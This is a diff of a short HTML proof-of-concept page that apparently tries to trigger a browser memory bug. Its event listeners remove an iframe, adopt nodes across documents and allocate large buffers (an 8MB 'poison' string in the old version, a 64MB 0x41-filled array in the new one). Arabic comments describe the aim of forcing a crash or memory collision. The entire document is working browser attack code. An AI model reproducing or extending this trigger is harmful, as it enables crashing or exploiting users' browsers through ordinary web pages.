@@ -1,35 +1,27 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <button onclick="main()">Click to trigger the bug</button>
+    <button onclick="main()">Click to trigger (Force Crash)</button>
     <div id="status">Status: Waiting...</div>
 
     <script>
         function main() {
-            document.getElementById('status').innerText = "Status: Triggering... (If browser freezes, wait 5s)";
-            
             const f = document.body.appendChild(document.createElement('iframe'));
             const a = document.createElement('div');
-            const b = a.appendChild(document.createElement('div'));
-
-            // دمج الـ poison مباشرة داخل الـ event handler بدون أي تأخير
-            a.addEventListener('a', eval(`(function () {
-                document.adoptNode(a);
-                f.remove();
+            
+            // إضافة Listener يقوم بتغيير الهيكلية بشكل أكثر عدوانية
+            a.addEventListener('a', () => {
+                f.remove(); // الحذف الفوري
                 
-                let poison = 'A'.repeat(1024 * 1024 * 8); // 8MB مباشرة
-
-                throw {
-                    sourceURL: poison
-                };
-            })`));
-
-            a.addEventListener('a', () => {});
-            b.addEventListener('a', () => {
-                f.contentDocument.adoptNode(a);
+                // تخصيص ذاكرة ضخمة جداً في نفس اللحظة
+                try {
+                    let trash = new Uint8Array(1024 * 1024 * 64); // 64MB لفرض تصادم الذاكرة
+                    for(let i=0; i<trash.length; i++) trash[i] = 0x41;
+                } catch(e) {}
             });
 
-            b.dispatchEvent(new Event('a', { bubbles: true }));
+            // إرسال الحدث
+            a.dispatchEvent(new Event('a'));
         }
     </script>
 </body>
